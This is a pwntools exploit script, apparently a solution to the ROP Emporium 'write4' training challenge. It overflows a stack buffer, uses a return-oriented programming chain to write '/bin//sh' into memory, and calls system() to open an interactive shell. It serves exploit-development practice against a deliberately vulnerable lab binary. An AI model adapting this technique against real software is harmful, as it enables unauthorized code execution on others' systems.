#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

def write_mem(address, string):
    chain =  p64(0x400890)  # pop r14; pop r15; ret
    chain += p64(address)
    chain += string
    chain += p64(0x400820)  # mov [r14],r15; ret
    return chain

def exploit():
    p = process('./write4')
    binary = ELF("write4", checksec=False)
    address = 0x6010c8  # address to start write to
    systemPLT = binary.symbols["system"]

    # create payload
    payload = 40*"A"
    payload += write_mem(address,  '/bin//sh') # write '/bin/sh' into memory
    payload += p64(0x400893)   # pop rdi; ret
    payload += p64(address)
    payload += p64(systemPLT)

    p.sendlineafter('> ', payload)
    p.interactive()

if __name__ == '__main__':
    exploit()
#_EOF